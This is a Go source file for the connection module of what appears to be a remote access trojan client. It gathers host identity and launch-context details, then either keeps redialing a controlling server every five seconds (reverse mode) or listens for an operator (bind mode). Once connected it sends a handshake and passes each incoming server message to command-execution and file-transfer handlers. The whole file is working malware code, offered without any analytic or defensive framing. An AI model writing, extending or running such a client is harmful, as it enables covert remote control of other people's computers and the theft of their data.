package connection

import (
	"log"
	"time"

	"client-go/config"
	"client-go/executor"
	"client-go/handler"
	"client-go/protocol"
	"net"
)

type Client struct {
	clientID string
	identity hostIdentity
	launch   launchContext
}

func New() *Client {
	return &Client{clientID: executor.NewClientID(), identity: detectHostIdentity(), launch: detectLaunchContext()}
}

func (c *Client) Run() {
	switch config.CONNECTION_MODE {
	case "reverse":
		c.runReverse()
	case "bind":
		c.runBind()
	default:
		log.Printf("unsupported connection mode: %s", config.CONNECTION_MODE)
	}
}

func (c *Client) runReverse() {
	for {
		conn, err := dialServer()
		if err != nil {
			log.Printf("RCH connection failed: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}
		c.serveConnection(conn)
		time.Sleep(5 * time.Second)
	}
}

func (c *Client) runBind() {
	listener, err := listenBind()
	if err != nil {
		log.Printf("RCH Bind listener failed: %v", err)
		return
	}
	defer listener.Close()
	log.Printf("RCH Bind listening on %s (%s)", listener.Addr(), config.SERVER_TRANSPORT)
	for {
		conn, err := acceptBind(listener)
		if err != nil {
			log.Printf("RCH Bind acceptance failed: %v", err)
			continue
		}
		c.serveConnection(conn)
	}
}

func (c *Client) serveConnection(conn net.Conn) {
	defer conn.Close()
	sock := protocol.NewRATSocket(conn)
	session := executor.NewSession(sock, c.clientID)
	defer session.CloseExecutions()
	defer session.CloseTransfers()
	if config.CONNECTION_MODE == "bind" {
		session.RequireSessionWebEndpoint()
	}
	if err := sock.Send(c.buildHandshake(session.CurrentDirectory())); err != nil {
		log.Printf("RCH handshake failed: %v", err)
		return
	}
	for {
		msg, err := sock.Recv()
		if err != nil {
			return
		}
		switch msg["type"] {
		case "connection_rejected":
			log.Printf("RCH connection rejected: %v", msg["message"])
			return
		case "session_config":
			if config.CONNECTION_MODE == "bind" {
				endpoint, ok := msg["server_web_base_url"].(string)
				if !ok {
					log.Printf("Invalid Bind Server Web URL")
					return
				}
				if err := session.SetServerWebBaseURL(endpoint); err != nil {
					log.Printf("RCH session config failed: %v", err)
					return
				}
			}
			continue
		}
		handler.Handle(session, msg)
	}
}
